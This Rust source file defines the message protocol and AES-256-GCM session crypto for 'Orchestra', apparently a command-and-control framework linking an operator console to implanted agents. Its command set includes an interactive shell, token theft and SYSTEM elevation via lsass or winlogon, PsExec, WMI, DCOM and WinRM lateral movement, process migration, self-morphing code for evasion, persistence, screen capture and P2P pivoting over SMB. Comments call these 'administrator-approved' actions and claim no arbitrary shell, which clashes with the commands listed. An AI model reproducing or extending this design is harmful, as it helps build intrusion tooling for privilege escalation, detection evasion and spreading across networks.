//! Shared protocol, error, and cryptographic primitives for the Orchestra
//! console <-> agent channel.

use aes_gcm::aead::{Aead, KeyInit};
use aes_gcm::{Aes256Gcm, Key, Nonce};
use rand::RngCore;
use serde::{Deserialize, Serialize};
use sha2::Sha256;
use thiserror::Error;
use zeroize::Zeroize;

/// Length in bytes of the AES-256 key used by [`CryptoSession`].
pub const KEY_LEN: usize = 32;
/// Length in bytes of the HKDF salt prepended to each encrypted message.
pub const SALT_LEN: usize = 32;
/// Length in bytes of the AES-GCM nonce prepended to each ciphertext.
pub const NONCE_LEN: usize = 12;

/// Wire-protocol version for the agent ↔ server channel.
///
/// Bump this whenever a breaking change is made to the [`Message`] encoding or
/// the connection-establishment sequence.  The agent sends a
/// [`Message::VersionHandshake`] as its first message and refuses to proceed
/// if the server's echo carries a different version.
///
/// Version 2 prefixes encrypted payloads with a per-session HKDF salt:
/// `salt(32) || nonce(12) || ciphertext_with_tag`.
pub const PROTOCOL_VERSION: u32 = 2;

/// Audit event logging for operator actions and agent state changes.
pub mod audit;
/// Agent and server configuration structures (TOML deserialization).
pub mod config;
/// X25519 forward-secrecy key exchange for session establishment.
pub mod forward_secrecy;
/// Indicator-of-compromise detection and reporting.
pub mod ioc;
/// Transport-layer normalization (Base64, Mask XOR, Netbios encoding).
pub mod normalized_transport;
/// P2P mesh protocol message types and link management.
pub mod p2p_proto;
/// TLS transport configuration and certificate handling.
pub mod tls_transport;

pub use audit::{AuditEvent, Outcome};

/// Top-level wire message exchanged between a console and an agent.
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum Message {
    /// First message exchanged on every new connection.
    ///
    /// The agent sends this before the registration [`Heartbeat`]; the server
    /// echoes back its own version.  Either side SHOULD log a warning and MAY
    /// close the connection when the received version differs from
    /// [`PROTOCOL_VERSION`].
    VersionHandshake {
        version: u32,
    },
    Heartbeat {
        timestamp: u64,
        agent_id: String,
        status: String,
    },
    TaskRequest {
        task_id: String,
        command: Command,
        /// Identity of the operator who issued the command. Populated by the
        /// Control Center from the authenticated API session; agents use it
        /// to attribute `AuditEvent` records rather than defaulting to
        /// `"admin"`.  `None` means the request came directly from a
        /// console without an operator identity (e.g. integration tests).
        #[serde(default)]
        operator_id: Option<String>,
    },
    TaskResponse {
        task_id: String,
        result: Result<String, String>,
        /// Optional binary result data from `ExecutePluginBinary`.
        /// `None` for all other command responses.
        #[serde(default)]
        result_data: Option<Vec<u8>>,
    },
    /// Push a signed, AES-GCM-encrypted capability module to the agent.
    /// `encrypted_blob` is the same wire format produced by
    /// `CryptoSession::encrypt`.
    ModulePush {
        module_name: String,
        version: String,
        encrypted_blob: Vec<u8>,
    },
    /// Agent reports the SHA-256 hash of its `.text` section after a morph
    /// operation.  Sent both in response to `MorphNow` (carried in
    /// `TaskResponse.result`) and proactively after the initial check-in
    /// morph triggered by the server-supplied seed.
    MorphResult {
        connection_id: String,
        text_hash: String,
    },
    AuditLog(AuditEvent),
    Shutdown,
    /// Agent requests a capability module by ID.  The server locates the
    /// module file on disk, signs and encrypts it, and replies with a
    /// [`ModuleResponse`].  This replaces the legacy direct-HTTP download
    /// path (`reqwest::get`) so that module transfer is tunnelled through
    /// the encrypted C2 channel.
    ModuleRequest {
        module_id: String,
    },
    /// Server delivers a signed, AES-GCM-encrypted module to the agent in
    /// response to a [`ModuleRequest`].  The `encrypted_blob` has the same
    /// wire format as [`ModulePush::encrypted_blob`] and can be fed directly
    /// to `module_loader::load_plugin`.
    ModuleResponse {
        module_id: String,
        encrypted_blob: Vec<u8>,
    },
    /// P2P mesh: a parent agent forwards C2 traffic on behalf of a child.
    ///
    /// `child_link_id` identifies the originating child in the parent's link
    /// table so the server can route the response back to the correct child.
    /// `data` is the **plaintext** C2 payload (e.g. a serialized
    /// `TaskResponse`) that the child intended for the server.  The C2
    /// transport layer encrypts the entire `Message` (including this variant)
    /// with the parent's AES-256-GCM session key before transmission, so
    /// `data` is encrypted in transit without requiring a separate encryption
    /// step.
    P2pForward {
        child_link_id: u32,
        data: Vec<u8>,
    },
    /// P2P mesh: the server sends C2 traffic addressed to a specific child
    /// through its parent.  The parent looks up `child_link_id` in its link
    /// table, re-encrypts `data` with the child's per-link ChaCha20-Poly1305
    /// key, and forwards it as a `DataForward` P2P frame.
    P2pToChild {
        child_link_id: u32,
        data: Vec<u8>,
    },
    /// P2P mesh topology report.  Sent periodically by each agent to its
    /// parent (or directly to the server if the agent has no parent).
    /// Contains the agent's current set of child links so the server can
    /// maintain a full mesh topology map.
    P2pTopologyReport {
        agent_id: String,
        children: Vec<P2pChildInfo>,
    },
}

/// A single child entry in a [`Message::P2pTopologyReport`].
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct P2pChildInfo {
    pub link_id: u32,
    pub agent_id: String,
}

/// The set of administrator-approved actions the agent is willing to perform.
///
/// The protocol intentionally does **not** expose an "execute arbitrary shell
/// command" variant. Scripts must be pre-registered on the endpoint and are
/// referenced by name via [`Command::RunApprovedScript`].
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum Command {
    Ping,
    GetSystemInfo,
    /// Run a script that has been pre-registered with the agent. `script` is
    /// the registered identifier, **not** an arbitrary command line.
    RunApprovedScript {
        script: String,
    },
    ListDirectory {
        path: String,
    },
    ReadFile {
        path: String,
    },
    WriteFile {
        path: String,
        content: Vec<u8>,
    },
    DeployModule {
        module_id: String,
    },
    ExecutePlugin {
        plugin_id: String,
        args: String,
    },
    StartShell,
    ShellInput {
        session_id: String,
        data: Vec<u8>,
    },
    ShellOutput {
        session_id: String,
    },
    /// Close the PTY session identified by `session_id`, terminating the
    /// child process and freeing the associated file descriptors.
    CloseShell {
        session_id: String,
    },
    Shutdown,
    DiscoverNetwork,
    CaptureScreen,
    SimulateKey {
        key: String,
    },
    SimulateMouse {
        x: i32,
        y: i32,
    },
    StartHciLogging,
    StopHciLogging,
    GetHciLogBuffer,
    ReloadConfig,
    /// Install the opt-in persistence service (systemd unit / scheduled task).
    EnablePersistence,
    /// Remove the persistence service installed by `EnablePersistence`.
    DisablePersistence,
    /// Move the agent into the address space of `target_pid` for load
    /// balancing or resource consolidation.
    MigrateAgent {
        target_pid: u32,
    },
    /// Return a JSON-serialized snapshot of running processes.
    ListProcesses,
    /// Set the seed used for periodic self-re-encoding of the agent's own
    /// `.text` section.  The seed is combined with a timestamp to derive a
    /// unique transformation on each re-encoding pass.  Only effective when
    /// the `self-reencode` feature is compiled in.
    SetReencodeSeed {
        seed: u64,
    },
    /// Immediately re-encode the agent's `.text` section with the supplied
    /// seed and report a SHA-256 hash of the new `.text` section back to
    /// the server.  Unlike `SetReencodeSeed` (which only stores the seed for
    /// the next periodic cycle), `MorphNow` triggers a synchronous
    /// transformation and returns the resulting hash in the `TaskResponse`.
    MorphNow {
        seed: u64,
    },
    /// Return a JSON array of metadata for all loaded plugins.
    ListPlugins,
    /// Remove a plugin from the loaded-plugin registry and release its resources.
    UnloadPlugin {
        plugin_id: String,
    },
    /// Return the full `PluginMetadata` for a specific loaded plugin.
    GetPluginInfo {
        plugin_id: String,
    },
    /// Download a module from the configured `module_repo_url` or a specified
    /// URL, store it in the cache directory, and optionally load it.
    DownloadModule {
        module_id: String,
        repo_url: Option<String>,
    },
    /// Execute a loaded plugin using the binary I/O path.  Returns raw bytes
    /// via `TaskResponse.result_data`.
    ExecutePluginBinary {
        plugin_id: String,
        input_data: Vec<u8>,
    },
    /// Query the status of an asynchronous plugin job.
    JobStatus {
        job_id: String,
    },

    // ── Token Manipulation (Windows only) ───────────────────────────────

    /// Create a new logon session with the provided credentials.
    /// Returns the new session's token handle information on success.
    MakeToken {
        username: String,
        password: String,
        domain: String,
        logon_type: u32,
    },
    /// Duplicate an existing process token via `OpenProcessToken` +
    /// `DuplicateTokenEx` and begin impersonating it.
    StealToken {
        target_pid: u32,
    },
    /// Revert to the original process token (undo `StealToken` / `MakeToken`).
    Rev2Self,
    /// Elevate to SYSTEM privileges via token impersonation (steal from a
    /// SYSTEM-owned process such as `winlogon.exe` or `lsass.exe`).
    GetSystem,

    // ── Lateral Movement (Windows only) ─────────────────────────────────

    /// Execute a command on a remote host via PsExec-style service creation.
    PsExec {
        target_host: String,
        command: String,
        username: Option<String>,
        password: Option<String>,
    },
    /// Execute a command on a remote host via WMI `IWbemServices`.
    WmiExec {
        target_host: String,
        command: String,
        username: Option<String>,
        password: Option<String>,
    },
    /// Execute a command on a remote host via DCOM (`ShellWindows` /
    /// `ShellBrowserWindow` COM object).
    DcomExec {
        target_host: String,
        command: String,
        username: Option<String>,
        password: Option<String>,
    },
    /// Execute a command on a remote host via WinRM SOAP requests.
    WinRmExec {
        target_host: String,
        command: String,
        username: Option<String>,
        password: Option<String>,
    },
    // ── P2P mesh management ────────────────────────────────────────────────
    /// Instruct a child agent to establish a P2P link to a parent agent.
    LinkAgents {
        parent_agent_id: String,
        child_agent_id: String,
        /// Transport to use: `"smb"` or `"tcp"`.
        transport: String,
        /// Target address for TCP links (host:port).  Ignored for SMB.
        #[serde(default)]
        target_addr: String,
    },
    /// Instruct an agent to disconnect from its P2P parent.
    UnlinkAgent {
        agent_id: String,
    },
    /// Return the full P2P mesh topology visible to this agent.
    ListTopology,
    // ── Agent-side P2P link management ─────────────────────────────────────
    /// Connect to a parent agent at the given address using the specified
    /// transport (`"tcp"` or `"smb"`).
    LinkTo {
        parent_addr: String,
        transport: String,
    },
    /// Disconnect from a P2P link.  `None` means disconnect from all links.
    Unlink {
        link_id: Option<u32>,
    },
    /// Report the current P2P links on this agent.
    ListLinks,
}

/// Errors produced by [`CryptoSession`].
#[derive(Debug, Error)]
pub enum CryptoError {
    #[error("ciphertext is too short to contain a nonce")]
    Truncated,
    #[error("AES-GCM authentication failed")]
    AuthenticationFailed,
}

/// AES-256-GCM symmetric session keyed from a pre-shared secret.
///
/// # Forward Secrecy Upgrade Plan (Roadmap to X25519 + HKDF)
///
/// Currently, `CryptoSession` derives a static symmetric key via HKDF from a pre-shared
/// secret. This provides no forward secrecy: if the PSK is compromised, all past traffic
/// can be decrypted. We will transition to an Ephemeral Diffie-Hellman (X25519) key exchange.
///
/// ## Transition Plan & Backward Compatibility
///
/// 1. **Protocol Negotiation / Versioning:**
///    - Introduce a new handshake message or a version flag in the initial connection.
///    - Clients capable of Forward Secrecy will send an `X25519` key share in their first
///      message.
///    - Legacy clients will simply send data encrypted under the current static PSK.
///
/// 2. **Authentication via PSK:**
///    - To prevent Man-In-The-Middle (MITM) attacks during the DH exchange, the static
///      PSK will be repurposed as a MAC/signature key (or injected into the HKDF
///      extractor) to mutually authenticate the ephemeral `X25519` public keys before
///      deriving the final session keys.
///
/// 3. **HKDF Key Derivation:**
///    - The new session key will be derived as:
///      `HKDF(IKM = DH_shared_secret, salt = random_nonce, info = PSK)`
///    - This binds the X25519 ephemeral exchange to the trusted identity.
///
/// 4. **Deprecation Phases:**
///    - **Phase 1 (Dual Support):** Servers support both static AES-GCM (legacy) and
///      X25519 ephemeral (modern) to allow seamless agent upgrades.
///    - **Phase 2 (Warning):** Connections using the old static scheme log a security
///      warning and require a specific `--allow-legacy-crypto` flag.
///    - **Phase 3 (Removal):** Static PSK code paths are entirely dropped, and the PSK
///      is used exclusively for authenticating the ephemeral DH exchange.
pub struct CryptoSession {
    cipher: Aes256Gcm,
    /// Copy of the raw key bytes, zeroed on drop.
    key: [u8; KEY_LEN],
    /// HKDF salt associated with this session.
    salt: [u8; SALT_LEN],
    /// Optional pre-shared secret used to derive per-message keys from wire salts.
    pre_shared_secret: Option<Vec<u8>>,
}

impl Drop for CryptoSession {
    fn drop(&mut self) {
        self.key.zeroize();
        if let Some(psk) = self.pre_shared_secret.as_mut() {
            psk.zeroize();
        }
    }
}

impl CryptoSession {
    fn derive_key_bytes(pre_shared_secret: &[u8], salt: &[u8]) -> [u8; KEY_LEN] {
        let hk = hkdf::Hkdf::<Sha256>::new(Some(salt), pre_shared_secret);
        let mut key_bytes = [0u8; KEY_LEN];
        hk.expand(b"orchestra-aes-gcm", &mut key_bytes)
            .expect("HKDF-SHA256 expand must succeed");
        key_bytes
    }

    fn decrypt_nonce_prefixed(cipher: &Aes256Gcm, ciphertext: &[u8]) -> Result<Vec<u8>, CryptoError> {
        if ciphertext.len() < NONCE_LEN {
            return Err(CryptoError::Truncated);
        }
        let (nonce_bytes, body) = ciphertext.split_at(NONCE_LEN);
        let nonce = Nonce::from_slice(nonce_bytes);
        cipher
            .decrypt(nonce, body)
            .map_err(|_| CryptoError::AuthenticationFailed)
    }

    /// Build a session from a pre-shared secret using HKDF-SHA256 and a random
    /// per-session salt.
    pub fn from_shared_secret(pre_shared_secret: &[u8]) -> Self {
        let mut salt = [0u8; SALT_LEN];
        rand::thread_rng().fill_bytes(&mut salt);
        Self::from_shared_secret_with_salt(pre_shared_secret, &salt)
    }

    /// Build a session from a pre-shared secret and an explicit HKDF salt.
    pub fn from_shared_secret_with_salt(pre_shared_secret: &[u8], salt: &[u8]) -> Self {
        let key_bytes = Self::derive_key_bytes(pre_shared_secret, salt);
        let key = Key::<Aes256Gcm>::from_slice(&key_bytes);

        let mut salt_bytes = [0u8; SALT_LEN];
        let copy_len = salt.len().min(SALT_LEN);
        salt_bytes[..copy_len].copy_from_slice(&salt[..copy_len]);

        Self {
            cipher: Aes256Gcm::new(key),
            key: key_bytes,
            salt: salt_bytes,
            pre_shared_secret: Some(pre_shared_secret.to_vec()),
        }
    }

    /// Build a session directly from a 32-byte key.
    pub fn from_key(key_bytes: [u8; KEY_LEN]) -> Self {
        let key = Key::<Aes256Gcm>::from_slice(&key_bytes);
        let mut salt = [0u8; SALT_LEN];
        rand::thread_rng().fill_bytes(&mut salt);
        Self {
            cipher: Aes256Gcm::new(key),
            key: key_bytes,
            salt,
            pre_shared_secret: None,
        }
    }

    /// Return a reference to the raw 32-byte AES-256-GCM key.
    ///
    /// Intended for registering the key with the memory-guard subsystem so it
    /// is encrypted while the agent is idle.  Prefer calling
    /// `memory_guard::register_session_key` rather than reading these bytes
    /// directly.
    pub fn key_bytes(&self) -> &[u8; KEY_LEN] {
        &self.key
    }

    /// Encrypt `plaintext` and return `salt || nonce || ciphertext_with_tag`.
    pub fn encrypt(&self, plaintext: &[u8]) -> Vec<u8> {
        let mut nonce_bytes = [0u8; NONCE_LEN];
        rand::thread_rng().fill_bytes(&mut nonce_bytes);
        let nonce = Nonce::from_slice(&nonce_bytes);
        let ciphertext = self
            .cipher
            .encrypt(nonce, plaintext)
            .expect("AES-GCM encryption is infallible for valid inputs");

        let mut out = Vec::with_capacity(SALT_LEN + NONCE_LEN + ciphertext.len());
        out.extend_from_slice(&self.salt);
        out.extend_from_slice(&nonce_bytes);
        out.extend_from_slice(&ciphertext);
        out
    }

    /// Decrypt a nonce-prefixed buffer (`nonce || ciphertext_with_tag`).
    ///
    /// This method assumes `self` was already built with the correct key/salt
    /// context. Callers receiving full wire-format payloads prefixed with salt
    /// SHOULD use [`Self::decrypt_with_psk`].
    pub fn decrypt(&self, ciphertext: &[u8]) -> Result<Vec<u8>, CryptoError> {
        // New format: salt || nonce || ciphertext_with_tag.
        // Try this path first for backward compatibility with existing callers
        // that pass encrypt() output directly to decrypt().
        if ciphertext.len() >= SALT_LEN + NONCE_LEN {
            let (salt, rest) = ciphertext.split_at(SALT_LEN);

            // If this session was created from a PSK, derive the per-message
            // key from the embedded salt so independently-created sessions
            // sharing the same PSK can still interoperate.
            if let Some(psk) = self.pre_shared_secret.as_ref() {
                let key_bytes = Self::derive_key_bytes(psk, salt);
                let key = Key::<Aes256Gcm>::from_slice(&key_bytes);
                let cipher = Aes256Gcm::new(key);
                if let Ok(plain) = Self::decrypt_nonce_prefixed(&cipher, rest) {
                    return Ok(plain);
                }
            } else if let Ok(plain) = Self::decrypt_nonce_prefixed(&self.cipher, rest) {
                // from_key sessions don't have a PSK; fall back to decrypting
                // the salt-stripped payload with the session key.
                return Ok(plain);
            }
        }

        // Legacy format: nonce || ciphertext_with_tag.
        Self::decrypt_nonce_prefixed(&self.cipher, ciphertext)
    }

    /// Decrypt a full wire-format message produced by [`Self::encrypt`]:
    /// `salt || nonce || ciphertext_with_tag`.
    pub fn decrypt_with_psk(psk: &[u8], wire_data: &[u8]) -> Result<Vec<u8>, CryptoError> {
        if wire_data.len() < SALT_LEN + NONCE_LEN {
            return Err(CryptoError::Truncated);
        }
        let (salt, rest) = wire_data.split_at(SALT_LEN);
        let session = Self::from_shared_secret_with_salt(psk, salt);
        session.decrypt(rest)
    }
}

pub mod transport;

/// Async transport abstraction over which framed [`Message`]s are exchanged.
///
/// Concrete implementations (TCP+TLS, QUIC, in-memory test harness) live in
/// downstream crates.
#[async_trait::async_trait]
pub trait Transport: Send {
    async fn send(&mut self, msg: Message) -> anyhow::Result<()>;
    async fn recv(&mut self) -> anyhow::Result<Message>;
}

/// Blanket impl so that `Box<dyn Transport + Send>` can itself be used as a `Transport`.
#[async_trait::async_trait]
impl<T: Transport + ?Sized + Send> Transport for Box<T> {
    async fn send(&mut self, msg: Message) -> anyhow::Result<()> {
        (**self).send(msg).await
    }
    async fn recv(&mut self) -> anyhow::Result<Message> {
        (**self).recv().await
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn encrypt_decrypt_roundtrip() {
        let psk = b"orchestra-dev-secret";
        let session = CryptoSession::from_shared_secret(psk);
        let plaintext = b"hello orchestra";
        let ct = session.encrypt(plaintext);
        assert!(ct.len() > SALT_LEN + NONCE_LEN);
        let pt = CryptoSession::decrypt_with_psk(psk, &ct).expect("decrypt");
        assert_eq!(pt, plaintext);
    }

    #[test]
    fn nonces_are_unique_per_encryption() {
        let a = CryptoSession::from_shared_secret(b"k").encrypt(b"same");
        let b = CryptoSession::from_shared_secret(b"k").encrypt(b"same");
        assert_ne!(a[..SALT_LEN], b[..SALT_LEN]);
        assert_ne!(a[SALT_LEN..SALT_LEN + NONCE_LEN], b[SALT_LEN..SALT_LEN + NONCE_LEN]);
        assert_ne!(a, b);
    }

    #[test]
    fn tampered_ciphertext_is_rejected() {
        let psk = b"k";
        let session = CryptoSession::from_shared_secret(psk);
        let mut ct = session.encrypt(b"payload");
        let mut idx = SALT_LEN + NONCE_LEN;
        if idx >= ct.len() {
            idx = ct.len() - 1;
        }
        ct[idx] ^= 0x01;
        let err = CryptoSession::decrypt_with_psk(psk, &ct).unwrap_err();
        assert!(matches!(err, CryptoError::AuthenticationFailed));
    }

    #[test]
    fn truncated_ciphertext_is_rejected() {
        let session = CryptoSession::from_shared_secret(b"k");
        let err = session.decrypt(&[0u8; NONCE_LEN - 1]).unwrap_err();
        assert!(matches!(err, CryptoError::Truncated));
    }

    #[test]
    fn message_serialization_roundtrip() {
        let msg = Message::TaskRequest {
            task_id: "t-1".into(),
            command: Command::RunApprovedScript {
                script: "rotate-logs".into(),
            },
            operator_id: None,
        };
        let bytes = bincode::serialize(&msg).unwrap();
        let back: Message = bincode::deserialize(&bytes).unwrap();
        match back {
            Message::TaskRequest {
                task_id, command, ..
            } => {
                assert_eq!(task_id, "t-1");
                assert!(matches!(
                    command,
                    Command::RunApprovedScript { script } if script == "rotate-logs"
                ));
            }
            _ => panic!("unexpected variant"),
        }
    }
}
